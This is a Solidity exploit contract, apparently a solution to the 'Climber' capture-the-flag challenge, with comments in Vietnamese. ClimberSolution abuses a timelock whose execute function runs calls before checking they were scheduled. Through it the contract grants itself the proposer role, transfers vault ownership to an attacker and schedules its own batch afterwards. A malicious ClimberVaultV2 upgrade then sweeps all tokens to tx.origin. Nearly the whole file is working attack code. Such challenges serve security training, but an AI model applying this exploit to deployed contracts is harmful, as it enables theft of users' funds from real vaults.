// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/utils/Address.sol";

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./ClimberVault.sol";
import "./ClimberTimelock.sol";

contract ClimberSolution {
    ClimberVault public immutable vault;
    address payable timelock;

    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;

    constructor(address payable _timelock, address _vault) {
        timelock = _timelock;
        vault = ClimberVault(_vault);
    }

    function attack(address attacker) external {
        // Contract Timelock đang có quyền admin với Timelock
        // Contract Timelock đang có quyền owner với Vault
        // Các lời gọi hàm bên dưới đều được thực hiện trong hàm execute của Timelock
        // -> msg.sender của các lời gọi hàm bên dưới đều là contract Timelock

        // Thực hiện lấy role proposer cho contract Solution
        // Vì contract Timelock là admin nên có quyền grant role
        targets.push(timelock);
        bytes memory data0 = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );
        dataElements.push(data0);
        values.push(0);

        // Thực hiện lấy quyền owner cho account attacker
        // Vì contract Timelock đang là owner của vault nên có quyền transfer owner
        targets.push(address(vault));
        bytes memory data1 = abi.encodeWithSignature(
            "transferOwnership(address)",
            attacker
        );
        dataElements.push(data1);
        values.push(0);

        // Thực hiện schedule để pass việc check id trong hàm execute
        targets.push(address(this));
        bytes memory data2 = abi.encodeWithSignature("schedule()");
        dataElements.push(data2);
        values.push(0);

        // Gọi hàm execute của Timelock để thực hiện 3 hành động bên trên
        ClimberTimelock(timelock).execute(targets, values, dataElements, "0x");

        // Sau khi execute thì account attacker đã là owner của Vault, nên có thể thực hiện upgrade Vault
    }

    // wrap lại hàm schedule để không bị vòng lặp vô tận!
    function schedule() external {
         // Lúc này contract Solution đã có quyền proposer nên có thể gọi schedule
        ClimberTimelock(timelock).schedule(targets, values, dataElements, "0x");
    }
}

// Sau khi lấy quyền owner của Vault, thì thực hiện upgrade lên VaultV2 để sửa đổi việc thực hiện hàm sweepFunds
contract ClimberVaultV2 is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    // Không cần role Sweeper để rút hết tiền nữa!
    function sweepFundsV2(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
        require(
            token.transfer(tx.origin, token.balanceOf(address(this))),
            "Transfer failed"
        );
    }

    // Hàm _authorizeUpgrade trong UUPS yêu cầu override 
    function _authorizeUpgrade(address newImplementation)
        internal
        override
        onlyOwner
    {}
}
